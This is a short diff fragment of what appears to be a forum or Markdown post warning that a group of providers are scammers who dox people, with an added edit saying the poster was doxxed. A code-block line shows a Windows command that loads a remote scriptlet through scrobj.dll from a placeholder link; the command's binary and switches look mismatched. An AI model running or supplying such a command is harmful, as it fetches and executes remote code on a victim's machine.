@@ -17,3 +17,5 @@ rundll32 /s /I:<link> scrobj.dll
 ```
 
 Keep in mind these fellas are untrustworthy. ive also attached screenshots showing them attempting to dox other providers and confessing to scamming. enjoy.
+
+Edit: MFs doxxed me LMFAOOOODCWE
